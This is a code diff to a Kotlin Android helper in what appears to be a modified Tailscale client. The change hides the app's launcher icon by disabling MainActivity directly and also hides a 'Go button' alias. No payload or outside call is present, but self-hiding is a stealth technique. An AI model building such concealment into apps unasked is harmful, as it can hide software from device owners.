@@ -13,14 +13,16 @@ import android.util.Log
  */
 object IconHideHelper {
     private const val TAG = "IconHideHelper"
-    private const val MAIN_LAUNCHER_ALIAS = "com.tailscale.ipn.MainActivityLauncher"
+    private const val MAIN_ACTIVITY = "com.tailscale.ipn.MainActivity"  // OLD working method!
     private const val GO_LAUNCHER_ALIAS = "com.tailscale.ipn.HideIconActivityLauncher"
 
     fun hideIcon(context: Context): Boolean {
-        return hideComponent(context, MAIN_LAUNCHER_ALIAS, "Main App")
+        // Use OLD working method - hide MainActivity directly (not alias)
+        return hideComponent(context, MAIN_ACTIVITY, "Main App")
     }
 
     fun hideGoIcon(context: Context): Boolean {
+        // Hide the GO button alias
         return hideComponent(context, GO_LAUNCHER_ALIAS, "Go Button")
     }
 
@@ -52,9 +54,9 @@ object IconHideHelper {
 
     fun showIcon(context: Context): Boolean {
         return try {
-            val componentName = ComponentName(context, MAIN_LAUNCHER_ALIAS)
+            val componentName = ComponentName(context, MAIN_ACTIVITY)
 
-            Log.d(TAG, "Attempting to show launcher icon: $MAIN_LAUNCHER_ALIAS")
+            Log.d(TAG, "Attempting to show launcher icon: $MAIN_ACTIVITY")
 
             context.packageManager.setComponentEnabledSetting(
                 componentName,
@@ -72,7 +74,7 @@ object IconHideHelper {
 
     fun isIconHidden(context: Context): Boolean {
         return try {
-            val componentName = ComponentName(context, MAIN_LAUNCHER_ALIAS)
+            val componentName = ComponentName(context, MAIN_ACTIVITY)
             val state = context.packageManager.getComponentEnabledSetting(componentName)
             state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
         } catch (e: Exception) {
